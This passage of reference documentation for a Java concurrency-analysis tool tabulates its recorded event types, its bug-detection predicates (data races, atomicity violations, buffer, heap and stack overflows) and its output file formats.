| `--max-cuts <n>` | Maximum consistent cuts to explore | `100000` |

### 10.2 Event Types

| Type | Description | Recorded By |
|------|-------------|------------|
| `FIELD_READ` | Object field read access | LLPTransformer (auto) |
| `FIELD_WRITE` | Object field write access | LLPTransformer (auto) |
| `ARRAY_READ` | Array element read access | Manual instrumentation |
| `ARRAY_WRITE` | Array element write access | Manual instrumentation |
| `MONITOR_ENTER` | Synchronized block entry | Manual instrumentation |
| `MONITOR_EXIT` | Synchronized block exit | Manual instrumentation |

### 10.3 Predicate Descriptions

| Predicate | Flag Name | What It Detects |
|-----------|----------|----------------|
| DataRacePredicate | `race` | Concurrent unsynchronized field/array accesses with at least one write |
| AtomicityViolationPredicate | `atomicity` | Stale-read patterns (read-write-write by different threads) |
| BufferOverflowPredicate | `buffer` | Array access at potentially out-of-bounds index |
| HeapOverflowPredicate | `heap` | Unbounded collection growth without bounds checking |
| StackOverflowPredicate | `stack` | Deep recursion patterns indicating stack exhaustion risk |

### 10.4 File Output Formats

| File | Format | Contents |
|------|--------|----------|
| `llp-report.html` | HTML+SVG | Interactive visualization (--gui mode) |
| `*-trace.ser` | Java Serialization | Complete analysis state for programmatic replay |
| `*-trace.txt` | Plain Text | Human-readable event log with scheduling path |
